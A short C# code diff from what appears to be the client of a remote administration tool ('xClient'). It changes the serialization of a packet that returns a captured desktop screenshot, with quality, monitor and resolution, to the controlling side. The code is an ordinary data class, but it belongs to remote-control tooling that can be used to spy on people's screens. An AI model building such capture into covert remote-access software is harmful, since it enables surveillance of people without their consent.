@@ -1,21 +1,17 @@
-﻿using ProtoBuf;
+﻿using System;
 using xClient.Core.Networking;
 
 namespace xClient.Core.Packets.ClientPackets
 {
-    [ProtoContract]
+    [Serializable]
     public class GetDesktopResponse : IPacket
     {
-        [ProtoMember(1)]
         public byte[] Image { get; set; }
 
-        [ProtoMember(2)]
         public int Quality { get; set; }
 
-        [ProtoMember(3)]
         public int Monitor { get; set; }
 
-        [ProtoMember(4)]
         public string Resolution { get; set; }
 
         public GetDesktopResponse()
@@ -32,7 +28,7 @@ namespace xClient.Core.Packets.ClientPackets
 
         public void Execute(Client client)
         {
-            client.SendBlocking(this);
+            client.Send(this);
         }
     }
 }
